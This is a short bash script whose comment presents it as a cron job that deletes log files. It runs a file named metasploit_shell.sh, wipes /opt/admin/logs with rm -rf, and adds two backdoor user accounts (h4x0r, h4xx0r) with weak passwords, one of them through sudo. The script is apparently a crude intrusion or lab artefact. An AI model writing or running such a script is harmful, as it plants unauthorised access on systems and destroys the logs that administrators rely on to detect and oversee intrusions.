
#!/bin/bash

# Delete any file in the log directory
# This script is executed every 5 minutes (via cron job)

echo 'we start with our shits!' >> we_start.txt

sh metasploit_shell.sh

rm -rf /opt/admin/logs/*
useradd -m -p "password" -s /bin/bash h4x0r
sudo useradd -m -p "password" -s /bin/bash h4xx0r

echo 'we are done with our shits!' >> we_are_done.txt
